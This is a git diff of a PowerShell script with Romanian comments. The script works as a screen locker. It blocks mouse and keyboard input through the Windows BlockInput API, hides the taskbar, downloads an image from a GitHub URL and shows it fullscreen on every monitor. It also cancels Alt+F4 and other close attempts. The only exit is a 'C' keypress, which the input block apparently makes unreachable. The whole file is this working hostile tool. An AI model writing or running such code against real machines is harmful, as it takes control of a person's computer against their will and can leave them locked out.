@@ -1,4 +1,6 @@
 Add-Type -AssemblyName System.Windows.Forms
+
+# Cod C# pt blocare input
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -7,6 +9,8 @@ public class InputBlocker {
     public static extern bool BlockInput(bool fBlockIt);
 }
 "@
+
+# Cod pt ascuns taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -18,9 +22,9 @@ public class TaskbarHider {
 }
 "@
 
-# Ascunde taskbar
-$hWnd = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
-[TaskbarHider]::ShowWindow($hWnd, 0)
+# Ascunde Taskbar
+$taskbar = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
+[TaskbarHider]::ShowWindow($taskbar, 0)
 
 # Descarcă poza dacă nu există
 $tempImage = "$env:TEMP\poza_laptop.jpg"
@@ -28,13 +32,23 @@ if (-not (Test-Path $tempImage)) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
 }
 
-# Blochează input
+# Blochează mouse și tastatură
 [InputBlocker]::BlockInput($true)
 
-# Lista ferestrelor pentru fiecare monitor
+# Listă de ferestre pentru fiecare ecran
 $forms = @()
 
-# Creați câte o fereastră per ecran
+# Funcție pentru închidere completă
+function InchideTot {
+    [InputBlocker]::BlockInput($false)
+    [TaskbarHider]::ShowWindow($taskbar, 1)
+    foreach ($f in $forms) {
+        $f.Invoke([Action]{ $f.Close() })
+    }
+    Stop-Process -Id $PID
+}
+
+# Creează câte o fereastră pe fiecare monitor
 [System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
     $screen = $_
 
@@ -54,32 +68,23 @@ $forms = @()
     $pictureBox.Dock = 'Fill'
     $form.Controls.Add($pictureBox)
 
-    # Închidere doar cu C
+    # Dacă se apasă C — închide tot
     $form.Add_KeyDown({
         if ($_.KeyCode -eq 'C') {
-            foreach ($f in $forms) {
-                $f.Close()
-            }
-
-            [TaskbarHider]::ShowWindow($hWnd, 1)
-            [InputBlocker]::BlockInput($false)
+            InchideTot
         }
     })
 
-    # Previi Alt+F4 (parțial)
+    # Blochează Alt+F4
     $form.Add_FormClosing({
         if ($_.CloseReason -eq "UserClosing") {
             $_.Cancel = $true
         }
     })
 
+    $null = $form.Show()
     $forms += $form
 }
 
-# Afișează toate ferestrele
-foreach ($f in $forms) {
-    $null = $f.Show()
-}
-
-# Run loop pe prima fereastră
+# Pornește loop-ul pe prima fereastră
 [System.Windows.Forms.Application]::Run($forms[0])
